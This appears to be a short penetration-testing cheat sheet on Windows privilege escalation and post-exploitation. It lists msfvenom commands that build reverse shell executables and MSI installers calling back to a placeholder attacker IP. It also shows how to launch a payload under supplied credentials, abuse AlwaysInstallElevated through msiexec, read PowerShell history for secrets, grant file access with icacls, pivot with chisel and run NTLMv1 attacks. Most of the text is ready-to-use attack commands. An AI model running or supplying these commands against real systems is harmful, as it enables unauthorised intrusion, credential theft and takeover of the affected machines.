Forwarding service

[TCP/UDP tunnel over HTTP](https://github.com/jpillora/chisel)

PowerShell history file

```cmd
REM location
cd C:\Users\<User Account>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine
REM file
type C:\Users\<User Account>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

[LAN Manager authentication level](https://docs.microsoft.com/en-us/windows/security/threat-protection/security-policy-settings/network-security-lan-manager-authentication-level)

- [NTLMv1 attack](https://github.com/SpiderLabs/Responder)

Check unusual programs

```
C:\Program Files
C:\Program Files (x86)
```

MSFVenom Reverse Shell Payload

```
msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
```

reverse shell with credential

```cmd
REM create payload
msfvenom -p windows/shell_reverse_tcp lhost=<attacker ip> lport=<attacker listening port> -f exe > rev.exe
REM change user, password and payload
powershell -c "$password = ConvertTo-SecureString '<password>' -AsPlainText -Force; $creds = New-Object System.Management.Automation.PSCredential('<user>', $password);Start-Process -FilePath "<payload>" -Credential $creds"
```

File owner access permission 

```cmd
REM check owner
dir /q /a
REM grant full access
icacls <file> /grant <user>:F
```

AlwaysInstallElevated

```
# AlwaysInstallElevated set to 1 in HKLM!
# AlwaysInstallElevated set to 1 in HKCU! 
# using msfvenom to create payload
msfvenom -p windows/x64/shell/reverse_tcp LHOST=<attacker ip> LPORT=<attacker port> -f msi -o reverse.msi
# execute <payload> = reverse.msi
msiexec /quiet /qn /i <payload>
```

Tools

[Chisel](https://github.com/jpillora/chisel):Pivoting 

Exploits

- CVE-2021-1732
- MS10-059